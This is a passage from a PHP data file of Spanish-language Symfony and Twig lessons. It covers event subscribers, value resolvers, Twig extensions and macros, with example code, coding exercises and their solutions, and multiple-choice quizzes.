                    'objective' => 'Construir un Event Subscriber en Symfony que escuche un evento de dominio (OrderPlacedEvent) y defina prioridades de ejecución ordenadas.',
                    'instructions' => 'Implementa OrderEventSubscriber implementando EventSubscriberInterface, implementando getSubscribedEvents() con prioridad alta (100) para el método reserveInventory y prioridad baja (-50) para trackAnalytics.',
                    'filename' => 'OrderEventSubscriber.php',
                    'starter_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Challenge;\n\nuse Symfony\\Component\\EventDispatcher\\EventSubscriberInterface;\n\nclass OrderEventSubscriber implements EventSubscriberInterface\n{\n    public static function getSubscribedEvents(): array\n    {\n        // TODO: Suscribir 'order.placed' con reserveInventory (prioridad 100) y trackAnalytics (prioridad -50)\n        return [];\n    }\n\n    public function reserveInventory(object \$event): void\n    {\n        // TODO: Lógica de reserva\n    }\n\n    public function trackAnalytics(object \$event): void\n    {\n        // TODO: Lógica de analíticas\n    }\n}\n",
                    'solution_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Challenge;\n\nuse Symfony\\Component\\EventDispatcher\\EventSubscriberInterface;\n\nclass OrderEventSubscriber implements EventSubscriberInterface\n{\n    public static function getSubscribedEvents(): array\n    {\n        return [\n            'order.placed' => [\n                ['reserveInventory', 100],\n                ['trackAnalytics', -50],\n            ],\n        ];\n    }\n\n    public function reserveInventory(object \$event): void\n    {\n        // Reserva prioritaria de inventario\n    }\n\n    public function trackAnalytics(object \$event): void\n    {\n        // Registro de métricas tras completar operaciones críticas\n    }\n}\n",
                    'explanation' => 'Mediante EventSubscriberInterface, un servicio declara explícitamente sus métodos y prioridades en código PHP puro. La prioridad 100 asegura que el inventario se reserve antes de cualquier otra tarea, mientras que la prioridad -50 garantiza que las analíticas corran al final.',
                ],
                'quiz' => [
                    'title' => 'Evaluación Técnica: Event Dispatcher en Symfony',
                    'questions' => [
                        [
                            'id' => 'q1',
                            'question' => '¿Cuál es la principal ventaja técnica de usar EventSubscriberInterface en lugar de configurar EventListeners en YAML?',
                            'options' => [
                                'a' => 'Los Subscribers se compilan directamente en C dentro de PHP.',
                                'b' => 'La configuración de eventos y prioridades está co-localizada en código PHP estático tipado, facilitando el autowiring, refactorización con IDEs y evitando duplicación en archivos de configuración.',
                                'c' => 'Los Listeners no soportan inyección de dependencias.',
                                'd' => 'Los Subscribers no consumen memoria RAM.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'Al implementar EventSubscriberInterface, la propia clase anuncia los eventos que escucha y con qué prioridad mediante getSubscribedEvents(), eliminando la necesidad de tags manuales en services.yaml.',
                        ],
                        [
                            'id' => 'q2',
                            'question' => '¿Cómo interpreta el EventDispatcher de Symfony las prioridades numéricas de los listeners?',
                            'options' => [
                                'a' => 'A menor número, antes se ejecuta (ej. -10 corre antes que 10).',
                                'b' => 'A mayor número, antes se ejecuta (ej. prioridad 100 corre antes que prioridad 0, y 0 antes que -50).',
                                'c' => 'Las prioridades solo pueden ser 0 o 1.',
                                'd' => 'Las prioridades se ordenan alfabéticamente.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'En Symfony, las prioridades son enteros con orden descendente: cuanto mayor sea el valor numérico, mayor prioridad tiene el listener y más pronto será invocado en la cadena.',
                        ],
                        [
                            'id' => 'q3',
                            'question' => '¿Qué sucede si un listener invoca `$event->stopPropagation()` durante el despacho de un evento?',
                            'options' => [
                                'a' => 'El EventDispatcher cancela inmediatamente la ejecución de todos los listeners restantes en la cola para ese evento.',
                                'b' => 'Se reinicia el contenedor de servicios.',
                                'c' => 'Se lanza una RuntimeException inmediata.',
                                'd' => 'Solo afecta a los listeners con prioridad negativa.',
                            ],
                            'correct' => 'a',
                            'explanation' => 'stopPropagation() rompe el bucle interno del despachador de eventos: ningún listener subsiguiente será notificado, útil para filtros de seguridad o respuestas tempranas.',
                        ],
                    ],
                ],
            ],

            // ==========================================
            // NIVEL 3: LECCIÓN 4: Routing, Argument Resolvers & Value Resolvers
            // ==========================================
            'symfony-routing-controllers' => [
                'slug' => 'symfony-routing-controllers',
                'title' => 'Routing, Argument Resolvers & Value Resolvers',
                'module' => 'Symfony Framework',
                'minutes' => 45,
                'difficulty' => 'Intermedio',
                'overview' => [
                    'concept' => 'En Symfony moderno, los controladores no deben ser vertederos de lógica procedural ni responsables de deserializar manualmente datos de peticiones HTTP. Symfony provee un pipeline sofisticado compuesto por el componente Routing (compilado en PHP puro con expresiones regulares unificadas de alto rendimiento) y los Value Resolvers (ValueResolverInterface), que extraen, validan e hidratan objetos fuertemente tipados directamente en los argumentos de la acción del controlador.',
                    'problem' => 'Controladores inflados (Fat Controllers) donde las primeras 25 líneas de cada método se dedican a hacer $id = $request->get("id");, $data = json_decode($request->getContent(), true);, validaciones manuales de claves y consultas repetitivas al repositorio para obtener entidades, ensuciando la arquitectura y dificultando el testing.',
                    'solution' => 'Utilizar Atributos nativos de PHP 8.4 (#[Route], #[MapRequestPayload], #[MapQueryParameter], #[MapEntity]) y construir Value Resolvers personalizados (ValueResolverInterface) para inyectar DTOs validados y modelos de dominio listos para usar directamente en la firma del método del controlador.',
                    'problem_label' => 'El Antipatrón del Fat Controller y Extracción Manual de Datos:',
                    'solution_label' => 'La Solución: Enrutamiento Compilado y Value Resolvers Tipados:',
                ],
                'internals' => [
                    'title' => 'Anatomía del Routing Compilado y Argument Resolution',
                    'steps' => [
                        [
                            'phase' => '1. Compilación de Rutas (UrlMatcher)',
                            'description' => 'Symfony no itera rutas una por una en cada petición. El Router recopila todas las rutas y compila un autómata finito con expresiones regulares agrupadas en un único archivo PHP (UrlMatcherCache). Una aplicación con 500 rutas encuentra el controlador correspondiente en menos de 0.2ms.',
                        ],
                        [
                            'phase' => '2. El Ciclo de ArgumentResolver',
                            'description' => 'El ArgumentResolver invoca a una cadena de ValueResolvers registrados. Cada resolver implementa resolve(Request $request, ArgumentMetadata $argument): iterable. Si el resolver reconoce el tipo del argumento, produce el valor adecuado.',
                        ],
                        [
                            'phase' => '3. #[MapRequestPayload] & #[MapQueryParameter]',
                            'description' => 'Atributos nativos de Symfony 6.3+ y 7/8. MapRequestPayload toma el body JSON, lo deserializa con SerializerComponent en un DTO inmutable y ejecuta ValidatorComponent. Si el payload es inválido, Symfony retorna un HTTP 422 Unprocessable Entity automáticamente sin tocar el controlador.',
                        ],
                        [
                            'phase' => '4. Value Resolvers de Dominio Personalizados',
                            'description' => 'Permite inyectar directamente objetos de dominio (ej. CurrentTenant, ApiKey, Money) en los métodos del controlador sin escribir lógica de extracción manual.',
                        ],
                    ],
                ],
                'architecture_code' => [
                    'filename' => 'src/ValueResolver/CurrentUserResolver.php',
                    'title' => 'Custom Value Resolver para Inyección de Usuario Autenticado',
                    'tag' => 'Symfony ValueResolverInterface',
                    'code' => "declare(strict_types=1);

namespace App\ValueResolver;

use App\DTO\CurrentUserDto;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpKernel\Controller\ValueResolverInterface;
use Symfony\Component\HttpKernel\ControllerMetadata\ArgumentMetadata;
use Symfony\Component\Security\Core\Authentication\Token\Storage\TokenStorageInterface;

class CurrentUserResolver implements ValueResolverInterface
{
    public function __construct(
        private readonly TokenStorageInterface \$tokenStorage
    ) {}

    /**
     * @return iterable<CurrentUserDto>
     */
    public function resolve(Request \$request, ArgumentMetadata \$argument): iterable
    {
        \$argumentType = \$argument->getType();
        if (\$argumentType !== CurrentUserDto::class) {
            return [];
        }

        \$token = \$this->tokenStorage->getToken();
        \$user = \$token?->getUser();

        if (!\$user) {
            return [];
        }

        yield new CurrentUserDto(
            id: (int) \$user->getUserIdentifier(),
            roles: \$user->getRoles()
        );
    }
}",
                ],
                'senior_mindset' => [
                    'thought_process' => 'Un Senior diseña controladores "skinny" (delgados) que se leen en 5 líneas de código: reciben un DTO validado por el framework (#[MapRequestPayload]), invocan a un caso de uso o comando de aplicación ($this->handler->handle($dto)), y retornan una Response tipada. Si un controlador tiene más de 30 líneas o contiene bloques try/catch masivos y validaciones de strings, el Senior detecta fuga de responsabilidades y falta de abstracción.',
                    'critical_questions' => [
                        '¿Este controlador está haciendo deserialización y validación manual en lugar de usar #[MapRequestPayload] con un DTO?',
                        '¿Podemos construir un Value Resolver reutilizable para este parámetro que se repite en 10 endpoints distintos?',
                        '¿El controlador tiene dependencias directas a Doctrine EntityManager cuando debería hablar con un Application Service o Command Bus?',
                        '¿Nuestras rutas tienen restricciones estrictas (requirements) en sus parámetros para evitar colisiones en el router compilado?',
                    ],
                ],
                'junior_vs_senior' => [
                    'problem_statement' => 'Crear un endpoint REST POST /api/v1/invoices que reciba un JSON de factura con cliente, items y montos, y cree la factura.',
                    'junior' => [
                        'approach' => 'En el controlador inyecta Request $request, hace $data = json_decode($request->getContent(), true). Verifica if (!isset($data["client_id"])) return new JsonResponse(["error" => "client_id required"], 400);. Luego busca al cliente con $em->getRepository(Client::class)->find($data["client_id"]), itera los items y hace $em->persist() en el mismo método.',
                        'flaws' => [
                            '40 líneas de código espagueti de validación y parsing en el controlador.',
                            'Sin tipado estricto: cualquier dato inesperado provoca warnings de PHP.',
                            'Imposible reutilizar la lógica de creación de facturas desde una consola CLI o un worker asíncrono.',
                        ],
                    ],
                    'senior' => [
                        'approach' => 'Firma del controlador: public function create(#[MapRequestPayload] CreateInvoiceDto $dto, InvoiceCreatorService $creator): JsonResponse. Symfony valida el DTO y los tipos. El controlador solo hace $invoice = $creator->create($dto); return $this->json($invoice, Response::HTTP_CREATED);.',
                        'rationale' => [
                            'Controlador de 3 líneas con 100% de expresividad.',
                            'El DTO y el Service pueden testearse de forma completamente aislada sin levantar el kernel HTTP.',
                            'Symfony genera automáticamente respuestas de error 422 con formato RFC 7807 problem details si los datos fallan la validación.',
                        ],
                        'trade_offs' => 'Requiere definir clases DTO dedicadas para cada entrada de la API.',
                    ],
                ],
                'exercise' => [
                    'title' => 'Reto de Código: Custom Value Resolver en Symfony 7/8',
                    'objective' => 'Implementar un Value Resolver personalizado que implemente ValueResolverInterface para inyectar una API Key extraída de una cabecera HTTP.',
                    'instructions' => 'Implementa ApiKeyResolver implementando ValueResolverInterface con el método resolve(Request $request, ArgumentMetadata $argument): iterable. Verifica si el argumento tiene nombre "apiKey", extrae la cabecera "X-Api-Key" y emite el valor con yield si existe.',
                    'filename' => 'ApiKeyResolver.php',
                    'starter_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Challenge;\n\nuse Symfony\\Component\\HttpFoundation\\Request;\nuse Symfony\\Component\\HttpKernel\\Controller\\ValueResolverInterface;\nuse Symfony\\Component\\HttpKernel\\ControllerMetadata\\ArgumentMetadata;\n\nclass ApiKeyResolver implements ValueResolverInterface\n{\n    /**\n     * @return iterable<string>\n     */\n    public function resolve(Request \$request, ArgumentMetadata \$argument): iterable\n    {\n        // TODO: Verificar si \$argument->getName() === 'apiKey'\n        // Si coincide, extraer el header 'X-Api-Key' y emitirlo con yield si existe\n        return [];\n    }\n}\n",
                    'solution_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Challenge;\n\nuse Symfony\\Component\\HttpFoundation\\Request;\nuse Symfony\\Component\\HttpKernel\\Controller\\ValueResolverInterface;\nuse Symfony\\Component\\HttpKernel\\ControllerMetadata\\ArgumentMetadata;\n\nclass ApiKeyResolver implements ValueResolverInterface\n{\n    /**\n     * @return iterable<string>\n     */\n    public function resolve(Request \$request, ArgumentMetadata \$argument): iterable\n    {\n        if (\$argument->getName() !== 'apiKey') {\n            return [];\n        }\n\n        \$apiKey = \$request->headers->get('X-Api-Key');\n        if (\$apiKey !== null && \$apiKey !== '') {\n            yield \$apiKey;\n        }\n    }\n}\n",
                    'explanation' => 'Al implementar ValueResolverInterface, desacoplamos la extracción de datos HTTP de los controladores. El controlador puede declarar simplemente function myAction(string $apiKey) y Symfony se encarga de resolver e inyectar el valor automáticamente.',
                ],
                'quiz' => [
                    'title' => 'Evaluación Técnica: Routing & Resolvers en Symfony',
                    'questions' => [
                        [
                            'id' => 'q1',
                            'question' => '¿Por qué el router compilado de Symfony es drásticamente más rápido que un bucle foreach de expresiones regulares?',
                            'options' => [
                                'a' => 'Porque compila todas las rutas en un autómata finito determinista y expresiones regulares unificadas en un único archivo PHP plano, resolviendo rutas en O(1) u O(log N).',
                                'b' => 'Porque delega el enrutamiento al servidor DNS.',
                                'c' => 'Porque solo admite un máximo de 10 rutas.',
                                'd' => 'Porque almacena las rutas en memoria de la tarjeta gráfica (GPU).',
                            ],
                            'correct' => 'a',
                            'explanation' => 'Symfony genera un archivo UrlMatcher compilado que agrupa expresiones regulares mediante prefijos comunes y árboles binarios, permitiendo matching instantáneo sin iterar ruta por ruta.',
                        ],
                        [
                            'id' => 'q2',
                            'question' => '¿Qué función cumple el atributo nativo `#[MapRequestPayload]` introducido en Symfony 6.3+?',
                            'options' => [
                                'a' => 'Guarda la petición en la base de datos MySQL.',
                                'b' => 'Deserializa el cuerpo JSON de la petición directamente en un DTO fuertemente tipado y ejecuta validaciones automáticas con Validator, retornando 422 si es inválido.',
                                'c' => 'Envía un correo electrónico con el payload.',
                                'd' => 'Comprime la petición con Gzip.',
                            ],
                            'correct' => 'b',
                            'explanation' => '#[MapRequestPayload] conecta el Serializer y el Validator de Symfony: toma el body HTTP, hidrata el DTO inmutable y valida sus restricciones antes de que el código del controlador se ejecute.',
                        ],
                        [
                            'id' => 'q3',
                            'question' => '¿Qué debe retornar el método `resolve(Request $request, ArgumentMetadata $argument)` en un Value Resolver si el argumento NO le corresponde?',
                            'options' => [
                                'a' => 'Debe lanzar una LogicException.',
                                'b' => 'Debe retornar un array vacío `[]`, permitiendo que el siguiente Value Resolver de la cadena intente resolverlo.',
                                'c' => 'Debe retornar null.',
                                'd' => 'Debe detener la ejecución del servidor.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'En ValueResolverInterface, si un resolver no soporta el argumento, debe retornar un iterable vacío ([]) para ceder el control al siguiente resolver en la cadena de ArgumentResolver.',
                        ],
                    ],
                ],
            ],

            // ==========================================
            // NIVEL 4: TWIG TEMPLATE ENGINE
            // ==========================================

            // ==========================================
            // NIVEL 4: LECCIÓN 1: Separación Estricta de Lógica de Presentación
            // ==========================================
            'twig-clean-separation' => [
                'slug' => 'twig-clean-separation',
                'title' => 'Separación Estricta de Lógica de Presentación',
                'module' => 'Twig Template Engine',
                'minutes' => 35,
                'difficulty' => 'Intermedio',
                'overview' => [
                    'concept' => 'Twig es un motor de plantillas fuertemente tipado que compila archivos .twig a clases PHP nativas optimizadas para OpCache en var/cache/twig/. Su misión exclusiva es transformar datos estructurados en representaciones visuales (HTML, XML, JSON, Markdown). Carece intencionadamente de constructs imperativos complejos para imponer la regla de oro de la arquitectura limpia: cero lógica de negocio y cero consultas de persistencia en la vista.',
                    'problem' => 'El antipatrón del "PHP embebido caótico" (Spaghetti Code). Desarrolladores inexpertos que ejecutan consultas SQL o lazy-loading masivo dentro de bucles Twig (provocando el problema de consultas N+1 en la vista), calculan impuestos complejos en las plantillas o concatenan strings HTML a mano, imposibilitando el testing unitario y degradando el rendimiento.',
                    'solution' => 'Separación estricta de responsabilidades: los controladores y Application Services preparan DTOs inmutables de presentación; Twig únicamente formatea y presenta. Para transformaciones repetitivas (monedas, fechas relativas, cálculos de visualización puros), se construyen Twig Extensions tipadas mediante AbstractExtension con TwigFilter y TwigFunction.',
                    'problem_label' => 'El Antipatrón de Lógica de Negocio y Queries en Plantillas:',
                    'solution_label' => 'La Solución: Twig Extensions Tipadas y DTOs de Presentación:',
                ],
                'internals' => [
                    'title' => 'Cómo Compila y Ejecuta Twig las Plantillas',
                    'steps' => [
                        [
                            'phase' => '1. Lexer & Token Stream',
                            'description' => 'Twig lee el archivo .html.twig y el Lexer lo convierte en un flujo de tokens (BLOCK_START, VAR_START, NAME, STRING, NUMBER). Detecta errores de sintaxis a nivel de token antes de construir estructuras.',
                        ],
                        [
                            'phase' => '2. Parser & Abstract Syntax Tree (AST)',
                            'description' => 'El Parser procesa los tokens construyendo un árbol de sintaxis abstracta (AST) de nodos Twig (NodeInterface). Los filtros (|filter), tests (is defined) y tags personalizados se validan y organizan en ramas de ejecución.',
                        ],
                        [
                            'phase' => '3. Compiler & Generación de Clases PHP Nativas',
                            'description' => 'El Compiler transforma el AST en una clase PHP nativa que extiende Twig\Template dentro de var/cache/twig/. Las variables de la plantilla se resuelven mediante el array \$context y las operaciones se convierten en código PHP plano.',
                        ],
                        [
                            'phase' => '4. Evaluación en Memoria & OpCache Warmup',
                            'description' => 'En producción con cache calentada (cache:warmup), Twig nunca lee archivos .twig de disco ni los parsea en runtime. OpCache precarga la clase compilada en memoria compartida, ejecutando la plantilla a velocidad de PHP puro.',
                        ],
                    ],
                ],
                'architecture_code' => [
                    'filename' => 'src/Twig/Extension/FinancialFormatterExtension.php',
                    'title' => 'Twig Extension Tipada para Formateo de Precios en Centavos',
                    'tag' => 'Symfony Twig Extension',
                    'code' => "declare(strict_types=1);

namespace App\Twig\Extension;

use NumberFormatter;
use Twig\Extension\AbstractExtension;
use Twig\TwigFilter;
use Twig\TwigFunction;

class FinancialFormatterExtension extends AbstractExtension
{
    public function getFilters(): array
    {
        return [
            new TwigFilter('price_cents', [\$this, 'formatPriceCents'], ['is_safe' => ['html']]),
            new TwigFilter('discount_rate', [\$this, 'formatDiscountRate']),
        ];
    }

    public function getFunctions(): array
    {
        return [
            new TwigFunction('currency_symbol', [\$this, 'getCurrencySymbol']),
        ];
    }

    public function formatPriceCents(int \$cents, string \$currency = 'EUR'): string
    {
        \$amount = \$cents / 100;
        \$formatter = new NumberFormatter('es_ES', NumberFormatter::CURRENCY);
        \$formatted = \$formatter->formatCurrency(\$amount, \$currency);

        return sprintf('<span class=\"financial-amount\">%s</span>', htmlspecialchars((string) \$formatted, ENT_QUOTES, 'UTF-8'));
    }

    public function formatDiscountRate(float \$rate): string
    {
        return sprintf('-%d%%', (int) round(\$rate * 100));
    }

    public function getCurrencySymbol(string \$currency = 'EUR'): string
    {
        return match (\$currency) {
            'EUR' => '€',
            'USD' => '$',
            'GBP' => '£',
            default => \$currency,
        };
    }
}",
                ],
                'senior_mindset' => [
                    'thought_process' => 'Un Senior nunca permite que una plantilla decida reglas de negocio ni realice llamadas I/O. Si en una vista ves `{% if order.customer.orders|length > 10 %}`, el Senior interviene: la plantilla está calculando si un cliente es VIP y disparando queries Doctrine invisibles. El servicio de aplicación debe entregar un DTO con `isVip: true` ya calculado. Twig solo debe preocuparse por renderizar etiquetas y colores.',
                    'critical_questions' => [
                        '¿Esta condición en la plantilla evalúa una regla de negocio que debería residir en el dominio o en el Application Service?',
                        '¿Acceder a esta propiedad en Twig está disparando lazy-loading de Doctrine que provocará consultas N+1 en la vista?',
                        '¿Podemos abstraer este formateo visual en un TwigFilter tipado para evitar duplicar lógica de cadenas en 20 plantillas?',
                        '¿Nuestras extensiones de Twig declaran adecuadamente las opciones de seguridad (\'is_safe\' => [\'html\']) para prevenir inyecciones XSS?',
                    ],
                ],
                'junior_vs_senior' => [
                    'problem_statement' => 'Formatear los precios de productos almacenados en enteros (centavos) y aplicar cálculo de IVA y descuentos promocionales en el catálogo web.',
                    'junior' => [
                        'approach' => 'En la plantilla Twig escribe fórmulas matemáticas: `{{ (product.priceCents / 100) * 1.21 - ((product.priceCents / 100) * 1.21 * product.discount) }}$`. Si cambia el IVA, debe editar 12 archivos .twig distintos.',
                        'flaws' => [
                            'Regla fiscal crítica hardcodeada en vistas HTML.',
                            'Errores de redondeo de punto flotante en la presentación del cliente.',
                            'Imposible testear con PHPUnit de forma aislada sin renderizar templates.',
                            'Cero reutilización y alto riesgo de inconsistencias de precios entre vistas.',
                        ],
                    ],
                    'senior' => [
                        'approach' => 'El servicio entrega un ProductCatalogItemDto con `finalPrice` y `taxAmount` ya calculados con precisión bancaria. En Twig se usa la extensión tipada `{{ item.finalPriceCents|price_cents }}`.',
                        'rationale' => [
                            'Consistencia garantizada: todas las vistas usan la misma extensión tipada.',
                            'La regla fiscal reside en el dominio y se comprueba con pruebas unitarias rápidas.',
                            'La plantilla Twig se mantiene 100% declarativa y legible.',
                        ],
                        'trade_offs' => 'Requiere definir DTOs de lectura y registrar la extensión en el contenedor DI de Symfony.',
                    ],
                ],
                'exercise' => [
                    'title' => 'Reto de Código: Twig Extension para Formateo de Precios en Centavos',
                    'objective' => 'Implementar una extensión de Twig tipada (FinancialTwigExtension) que extienda AbstractExtension y registre el filtro price_cents para formatear centavos enteros a formato monetario estándar.',
                    'instructions' => 'Define FinancialTwigExtension extendiendo Twig\Extension\AbstractExtension. Registra el filtro "price_cents" en getFilters() asociándolo al método formatCents(int $cents): string. Si $cents es negativo, lanza una InvalidArgumentException. Formatea el precio retornando el valor con símbolo de dólar y dos decimales (ej. 1500 -> "$15.00").',
                    'filename' => 'FinancialTwigExtension.php',
                    'starter_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Challenge;\n\nuse Twig\\Extension\\AbstractExtension;\nuse Twig\\TwigFilter;\n\nclass FinancialTwigExtension extends AbstractExtension\n{\n    public function getFilters(): array\n    {\n        // TODO: Retornar array con TwigFilter('price_cents', [\$this, 'formatCents'])\n        return [];\n    }\n\n    public function formatCents(int \$cents): string\n    {\n        // TODO: Validar que \$cents no sea negativo o lanzar InvalidArgumentException\n        // Retornar formato de precio monetario '$' con dos decimales (ej. 1500 -> '$15.00')\n        return '';\n    }\n}\n",
                    'solution_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Challenge;\n\nuse InvalidArgumentException;\nuse Twig\\Extension\\AbstractExtension;\nuse Twig\\TwigFilter;\n\nclass FinancialTwigExtension extends AbstractExtension\n{\n    public function getFilters(): array\n    {\n        return [\n            new TwigFilter('price_cents', [\$this, 'formatCents']),\n        ];\n    }\n\n    public function formatCents(int \$cents): string\n    {\n        if (\$cents < 0) {\n            throw new InvalidArgumentException('El monto en centavos no puede ser negativo.');\n        }\n\n        return sprintf('$%.2f', \$cents / 100);\n    }\n}\n",
                    'explanation' => 'Las extensiones de Twig desacoplan la lógica de transformación visual del marcado HTML. Al implementar AbstractExtension y registrar TwigFilter tipados, centralizamos la presentación de datos monetarios sin contaminar los modelos de dominio con detalles de formato.',
                ],
                'quiz' => [
                    'title' => 'Evaluación Técnica: Separación de Responsabilidades y Compilación en Twig',
                    'questions' => [
                        [
                            'id' => 'q1',
                            'question' => '¿Qué genera el compilador de Twig en var/cache/twig/ durante la fase de calentamiento de caché (cache:warmup)?',
                            'options' => [
                                'a' => 'Archivos HTML estáticos pre-renderizados.',
                                'b' => 'Clases PHP nativas fuertemente tipadas que extienden Twig\\Template y que OpCache precarga en memoria compartida.',
                                'c' => 'Scripts de base de datos MySQL.',
                                'd' => 'Archivos binarios en lenguaje C.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'Twig es un compilador: traduce plantillas a clases PHP nativas en var/cache/twig/. En producción, el rendimiento es idéntico a ejecutar código PHP nativo directamente desde la memoria compartida de OpCache.',
                        ],
                        [
                            'id' => 'q2',
                            'question' => '¿Por qué un desarrollador Senior prohíbe realizar consultas o acceder a colecciones perezosas (lazy-loaded) de Doctrine en plantillas Twig?',
                            'options' => [
                                'a' => 'Porque Twig no tiene soporte para Doctrine.',
                                'b' => 'Porque acceder a relaciones no inicializadas dentro de bucles en la vista genera consultas SQL N+1 silenciosas y degrada gravemente el tiempo de respuesta.',
                                'c' => 'Porque Doctrine solo funciona en la consola de comandos.',
                                'd' => 'Porque las consultas en vistas ocupan el 100% de la memoria de la GPU.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'Si una plantilla accede a propiedades de entidades que no fueron pre-cargadas (eager loaded con JOIN), Doctrine ejecuta una consulta SQL por cada iteración del bucle, convirtiendo una petición rápida en cientos de viajes a la base de datos.',
                        ],
                        [
                            'id' => 'q3',
                            'question' => '¿Cuál es la diferencia arquitectónica entre un TwigFilter y una TwigFunction en una extensión de Twig?',
                            'options' => [
                                'a' => 'Un filtro se aplica a un valor existente mediante la tubería (|) para transformarlo (ej. valor|price_cents); una función se invoca por su nombre para generar o calcular datos (ej. currency_symbol()).',
                                'b' => 'Los filtros solo admiten texto y las funciones solo números.',
                                'c' => 'Las funciones no pueden registrarse en AbstractExtension.',
                                'd' => 'Los filtros se ejecutan en el navegador web mediante JavaScript.',
                            ],
                            'correct' => 'a',
                            'explanation' => 'En la convención de diseño de Twig, los filtros actúan como transformadores en cadena sobre variables existentes (input -> transform -> output), mientras que las funciones generan valores de contexto o calculan estructuras independientes.',
                        ],
                    ],
                ],
            ],

            // ==========================================
            // NIVEL 4: LECCIÓN 2: Herencia Jerárquica & Componentes Reutilizables
            // ==========================================
            'twig-inheritance-components' => [
                'slug' => 'twig-inheritance-components',
                'title' => 'Herencia Jerárquica & Componentes Reutilizables',
                'module' => 'Twig Template Engine',
                'minutes' => 40,
                'difficulty' => 'Intermedio',
                'overview' => [
                    'concept' => 'La arquitectura visual en Twig se cimienta sobre dos mecanismos complementarios: Herencia Jerárquica de bloques ({% extends %} y {% block %}) para layouts y páginas base, y Composición Atómica ({% embed %}, {% include with { ... } only %} y {% macro %}) para componentes de interfaz independientes, aislados y reusables.',
                    'problem' => 'Plantillas monolíticas de más de 1,000 líneas con duplicación masiva de código HTML. Copiar y pegar modales, tarjetas o botones idénticos en 15 vistas distintas genera inconsistencias de CSS, roturas visuales accidentales y fugas de variables del contexto global que provocan comportamientos impredecibles.',
                    'solution' => 'Construir una jerarquía limpia: un layout base (base.html.twig) que expone bloques semánticos (title, stylesheets, body, javascripts), composición de widgets mediante macros tipadas con parámetros obligatorios, y aislamiento estricto de variables mediante el modificador "only" en plantillas incluidas.',
                    'problem_label' => 'El Antipatrón de Plantillas Monolíticas y Duplicación de Marcado:',
                    'solution_label' => 'La Solución: Herencia de Bloques y Macros Atómicas Reutilizables:',
                ],
                'internals' => [
                    'title' => 'Mecánica del Árbol de Bloques y Resolución Estática',
                    'steps' => [
                        [
                            'phase' => '1. Grafo de Herencia y Block Overriding',
                            'description' => 'Twig compila la directiva {% extends %} estableciendo una relación de herencia entre clases PHP. Cuando la plantilla hija define un bloque {% block content %}, la clase compilada reemplaza estáticamente el método block_content() de la clase padre.',
                        ],
                        [
                            'phase' => '2. Resolución de parent() sin I/O',
                            'description' => 'Invocar {{ parent() }} no lee la plantilla padre de disco: en el código PHP compilado se traduce a una llamada directa parent::block_content(\$context, \$blocks), preservando el rendimiento.',
                        ],
                        [
                            'phase' => '3. Aislamiento con {% include with { ... } only %}',
                            'description' => 'Por defecto, {% include %} hereda todas las variables del contexto actual. Agregar el modificador \"only\" desvincula la plantilla incluida del contexto global, obligando a pasar explícitamente solo las variables que el componente necesita.',
                        ],
                        [
                            'phase' => '4. Macros: Funciones de Plantilla Puras',
                            'description' => 'Las macros {% macro name(args) %} operan como funciones puras: no tienen acceso a variables externas salvo que se pasen por parámetro o se inyecte _context explícitamente, garantizando total encapsulación.',
                        ],
                    ],
                ],
                'architecture_code' => [
                    'filename' => 'templates/macros/ui_components.html.twig',
                    'title' => 'Macros de Twig para Componentes de Interfaz con Tipado y Variantes',
                    'tag' => 'Twig Component Macros',
                    'code' => "{# Macro para renderizar badges de estado accesibles y tipados #}
{% macro badge(label, variant, size) %}
    {% set variantClass = {
        'primary': 'badge-primary',
        'success': 'badge-success',
        'warning': 'badge-warning',
        'danger': 'badge-danger'
    }[variant|default('primary')]|default('badge-primary') %}

    {% set sizeClass = size|default('md') == 'sm' ? 'badge-sm' : 'badge-md' %}

    <span class=\"badge {{ variantClass }} {{ sizeClass }}\" role=\"status\">
        {{ label }}
    </span>
{% endmacro %}

{# Macro para tarjetas de alerta reutilizables con soporte de cierre #}
{% macro alert(title, message, type, dismissible) %}
    {% set alertClass = type|default('info') in ['success', 'warning', 'danger', 'info'] ? type : 'info' %}

    <div class=\"alert alert-{{ alertClass }} {{ dismissible|default(false) ? 'alert-dismissible' : '' }}\" role=\"alert\">
        {% if title is defined and title %}
            <strong class=\"alert-heading\">{{ title }}</strong>
        {% endif %}
        <p class=\"alert-body\">{{ message }}</p>
    </div>
{% endmacro %}",
                ],
                'senior_mindset' => [
                    'thought_process' => 'Un Senior aplica el principio DRY (Don\'t Repeat Yourself) en las plantillas con el mismo rigor que en el código de backend. Se pregunta: ¿Este elemento de UI se repetirá en más de dos vistas? Si es un componente visual interactivo (un modal, un banner de alerta, una tarjeta de usuario), se crea una macro o un componente aislado con un contrato estricto de parámetros. Además, usa siempre `only` en los includes para evitar que variables secundarias colisionen con las variables de la página principal.',
                    'critical_questions' => [
                        '¿Estamos usando {% extends %} para layouts jerárquicos y macros para componentes atómicos independientes?',
                        '¿Estamos protegiendo el contexto de variables usando {% include ... only %} para evitar dependencias acopladas implícitas?',
                        '¿La macro valida las variantes visuales permitidas en lugar de inyectar clases CSS arbitrarias del usuario?',
                        '¿Estamos utilizando {{ parent() }} para extender scripts o estilos en bloques secundarios sin destruir los recursos base?',
                    ],
                ],
                'junior_vs_senior' => [
                    'problem_statement' => 'Mostrar tarjetas de alerta informativas y de error en 20 formularios y pantallas del panel de administración.',
                    'junior' => [
                        'approach' => 'Copia y pega las 12 líneas de HTML de Bootstrap/Tailwind de la alerta en cada archivo .twig. Cuando el equipo de diseño decide cambiar el icono de advertencia, debe buscar y editar 20 archivos a mano.',
                        'flaws' => [
                            'Duplicación de código incontrolable.',
                            'Inconsistencias de accesibilidad (atributos ARIA olvidados en la mitad de las vistas).',
                            'Mantenimiento extremadamente costoso y propenso a errores humanos.',
                        ],
                    ],
                    'senior' => [
                        'approach' => 'Crea la macro `ui.alert(title, message, type, dismissible)` en un archivo de componentes central. En cada vista solo invoca `{{ ui.alert(\'Error\', form.error, \'danger\') }}`.',
                        'rationale' => [
